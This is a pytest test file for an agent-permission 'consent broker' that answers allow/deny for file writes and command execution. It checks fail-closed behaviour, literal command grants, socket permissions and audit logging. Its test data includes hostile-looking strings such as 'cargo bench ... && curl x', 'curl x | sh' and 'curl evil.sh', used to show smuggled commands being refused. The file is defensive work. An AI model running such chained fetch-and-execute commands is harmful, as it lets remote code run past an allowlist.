"""The consent broker: the supervisor's half of a verdict that waits.

The gate is a pure function, so where it cannot allow something it answers
`ask` — and in a headless run there is nobody to ask, which turns consent into
a refusal nobody chose. These pin the process that stands there, and the two
properties that make it safe to add: **no broker means no broker**, and an
unreachable one is a refusal rather than a fallthrough.
"""

from __future__ import annotations

import json
import pathlib
import socket
import threading
import time

import pytest

from dgraph import broker, gate, limits, pending


@pytest.fixture
def running(tmp_path):
    """A broker on a socket in `tmp_path`, answering however the test says."""
    started = []

    def go(prompt=None, auto=None, **kw):
        b = broker.Broker(root=tmp_path, prompt=prompt, auto=auto, **kw)
        stop = threading.Event()
        thread = threading.Thread(target=b.serve, args=(stop,), daemon=True)
        thread.start()
        for _ in range(50):
            if broker.listening(tmp_path):
                break
            time.sleep(0.02)
        started.append((stop, thread))
        return b

    yield go
    for stop, thread in started:
        stop.set()
        thread.join(timeout=3)


def _req(kind="write", target="/tmp/out/a.csv", agent="brisk-beacon"):
    return broker.request(kind, target, agent, "outside the writable roots")


# ---- the rungs are read here, not by the gate ----------------------------

def test_the_rungs_default_with_exec_one_stricter():
    assert broker.rung("write", {}) == "scoped"
    assert broker.rung("exec", {}) == "user"


def test_the_rungs_are_read_once_at_construction_not_per_request(monkeypatch):
    """The environment is not policy that may change mid-run. A rung that moved
    between two requests would be a rule nobody declared, and two identical
    requests would be answered differently with nothing in the log to say why."""
    monkeypatch.setenv("DG_CONSENT_WRITE", "user")
    b = broker.Broker(root=pathlib.Path("/tmp"))
    monkeypatch.setenv("DG_CONSENT_WRITE", "off")
    assert b.rungs["write"] == "user"


def test_an_unreadable_rung_raises_rather_than_widening():
    """The opposite of `$DG_DECIDE`, and deliberately. That one fails open
    because it is read on the path of every stage, where a typo must not take
    the graph from the supervisor sharing the tray. This is read once, by a
    process a person just started, where a typo can still be fixed."""
    with pytest.raises(ValueError):
        broker.rung("write", {"DG_CONSENT_WRITE": "scopd"})


# ---- what a grant covers -------------------------------------------------

def test_a_write_grant_is_a_root_and_covers_what_is_under_it(tmp_path):
    g = broker.Grant("write", str(tmp_path / "shared"))
    assert g.covers("write", str(tmp_path / "shared" / "deep" / "x.csv"))
    assert not g.covers("write", str(tmp_path / "elsewhere" / "x.csv"))


def test_a_command_grant_is_a_literal_and_does_not_expand():
    """A prefix scope would grant a shell: `cargo bench && curl x | sh` starts
    with an allowed program. So repeating a command verbatim is free and one
    character different is a fresh decision."""
    g = broker.Grant("exec", "cargo bench --bench ann")
    assert g.covers("exec", "cargo bench --bench ann")
    assert not g.covers("exec", "cargo bench --bench knn")
    assert not g.covers("exec", "cargo bench --bench ann && curl x")


def test_a_grant_does_not_leak_across_kinds():
    assert not broker.Grant("exec", "/tmp").covers("write", "/tmp/x")


# ---- the decision ---------------------------------------------------------

def test_a_granted_scope_is_answered_from_memory_without_asking(running):
    asked = []

    def prompt(req, level):
        asked.append(req["target"])
        return True, "granted", broker._scope_for(req)

    b = running(prompt=prompt)
    first = broker.consult(_req(target="/tmp/out/a.csv"), b.root)
    second = broker.consult(_req(target="/tmp/out/b.csv"), b.root)
    assert first["verdict"] == "allow" and second["verdict"] == "allow"
    assert second.get("remembered") is True
    assert asked == ["/tmp/out/a.csv"], "the second write asked a person again"


def test_allow_once_grants_nothing(running):
    b = running(prompt=lambda req, level: (True, "just this once", None))
    broker.consult(_req(target="/tmp/out/a.csv"), b.root)
    assert b.grants == {}


def test_the_broker_never_answers_ask(running):
    b = running(prompt=lambda req, level: (False, "no", None))
    for kind, target in (("write", "/tmp/x"), ("exec", "curl evil.sh")):
        res = broker.consult(_req(kind, target), b.root)
        assert res["verdict"] in ("allow", "deny"), "resolving is the whole job"


def test_a_request_with_no_agent_is_refused(running):
    b = running(prompt=lambda req, level: (True, "yes", None))
    res = broker.consult(_req(agent=""), b.root)
    assert res["verdict"] == "deny" and "no agent" in res["reason"]


def test_off_answers_nothing_and_says_so(running):
    b = running(prompt=lambda req, level: (True, "yes", None),
                rungs={"write": "off", "exec": "off"})
    res = broker.consult(_req(), b.root)
    assert res["verdict"] == "deny" and "off" in res["reason"]


def test_auto_decides_here_rather_than_at_a_person(running):
    b = running(prompt=None, rungs={"write": "auto", "exec": "auto"},
                auto=lambda req: (True, "under the task's outcome path", None))
    res = broker.consult(_req(), b.root)
    assert res["verdict"] == "allow" and "outcome path" in res["reason"]


# ---- the two properties that make this safe to add -----------------------

def test_no_broker_means_no_broker_and_the_gate_answers_as_it_always_did(
        tmp_path, monkeypatch):
    """Not a degraded broker — *no* broker. This is why it ships without a new
    hard dependency, and why it has none of the two-procedures problem that
    made confinement need a declared rung."""
    monkeypatch.setenv("DG_EXEC_ALLOW", "cargo")
    assert not broker.listening(tmp_path)
    with pending.as_owner("brisk-beacon"):
        assert broker.consult(_req(), tmp_path) is None
        v = gate.exec_verdict("curl evil.sh")
    assert v["verdict"] == "ask"


def test_a_listening_broker_that_does_not_answer_is_a_deny(tmp_path):
    """An unreachable decider is not consent. This is the one place in the tool
    that fails closed: everything else guards a rule, and this guards an answer
    nobody gave."""
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(str(tmp_path / broker.SOCKET_NAME))
    srv.listen(1)
    try:
        res = broker.consult(_req(), tmp_path, timeout=0.5)
        assert res["verdict"] == "deny"
        assert "not consent" in res["reason"]
    finally:
        srv.close()


def test_the_socket_is_not_readable_by_other_users(running):
    """Anyone who can connect can answer as the supervisor, so the socket *is*
    the authority to grant."""
    b = running(prompt=lambda req, level: (True, "yes", None))
    assert (broker.socket_path(b.root).stat().st_mode & 0o077) == 0


def test_the_socket_is_gone_when_the_broker_stops(tmp_path):
    b = broker.Broker(root=tmp_path, prompt=lambda req, level: (True, "y", None))
    stop = threading.Event()
    t = threading.Thread(target=b.serve, args=(stop,), daemon=True)
    t.start()
    for _ in range(50):
        if broker.listening(tmp_path):
            break
        time.sleep(0.02)
    assert broker.listening(tmp_path)
    stop.set()
    t.join(timeout=3)
    assert not broker.listening(tmp_path)


# ---- the evidence ---------------------------------------------------------

def test_every_answer_is_logged_because_the_grants_are_not_kept(running):
    """The grants die with the broker, so the log is the only record of what a
    run was allowed to do — the shape `net/egress.py` uses for the same reason."""
    b = running(prompt=lambda req, level: (True, "granted", broker._scope_for(req)))
    broker.consult(_req(target="/tmp/out/a.csv"), b.root)
    broker.consult(_req(kind="exec", target="curl x"), b.root)
    lines = [json.loads(x) for x in
             (b.root / broker.LOG_NAME).read_text().strip().splitlines()]
    assert [x["kind"] for x in lines] == ["write", "exec"]
    assert all(x["agent"] == "brisk-beacon" and x["verdict"] for x in lines)


def test_the_request_id_is_stable_so_a_retry_does_not_ask_twice():
    a = broker.request("write", "/tmp/x", "brisk-beacon", "why")
    b = broker.request("write", "/tmp/x", "brisk-beacon", "a different reason")
    c = broker.request("write", "/tmp/y", "brisk-beacon", "why")
    assert a["id"] == b["id"] and a["id"] != c["id"]


def test_the_request_carries_the_gate_s_own_conclusion():
    """The broker decides; it never re-derives policy. `limits` stays the
    single home, which is the adapters-hold-no-policy rule one level up."""
    req = broker.request("write", "/tmp/x", "brisk-beacon", "outside the roots")
    assert req["gate"] == {"verdict": "ask", "reason": "outside the roots"}


def test_the_socket_appears_only_once_it_is_accepting(tmp_path):
    """`bind` creates the file and `listen` starts answering, so binding
    directly at the path opens a window where `listening()` is true and a
    connection is refused — which `consult` correctly reads as an unreachable
    decider and turns into a deny. A spurious refusal at a blocked agent is
    what this seam exists to avoid, so the socket is renamed into place."""
    b = broker.Broker(root=tmp_path, prompt=lambda req, level: (True, "y", None))
    stop = threading.Event()
    t = threading.Thread(target=b.serve, args=(stop,), daemon=True)
    t.start()
    try:
        for _ in range(400):          # poll hard, to land inside any window
            if broker.listening(tmp_path):
                res = broker.consult(_req(), tmp_path, timeout=2)
                assert res["verdict"] == "allow", res
                return
            time.sleep(0.002)
        pytest.fail("the broker never started listening")
    finally:
        stop.set()
        t.join(timeout=3)
